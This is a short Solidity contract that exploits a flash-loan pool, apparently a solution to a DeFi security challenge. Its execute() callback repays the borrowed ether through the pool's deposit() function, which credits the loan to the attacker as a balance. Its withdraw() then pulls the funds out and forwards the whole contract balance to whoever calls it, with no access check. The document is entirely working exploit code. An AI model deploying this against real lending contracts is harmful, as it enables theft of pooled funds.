pragma solidity ^0.6.0;

interface Pool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract Lender {
    address payable private pool;

    constructor(address payable poolAddress) public {
        pool = poolAddress;
    }

    // Fallback
    fallback() external payable {}

    function deposit() external payable {
        Pool(pool).deposit{ value: msg.value }();
    }

    function withdraw() external payable {
        Pool(pool).withdraw();
        msg.sender.call.value(address(this).balance)("");
    }

    function flashLoan(uint256 amount) external {
        Pool(pool).flashLoan(amount);
    }

    function execute() external payable {
        // Repay the flash loan, but also increase own balance
        Pool(pool).deposit{ value: msg.value }();
    }
}
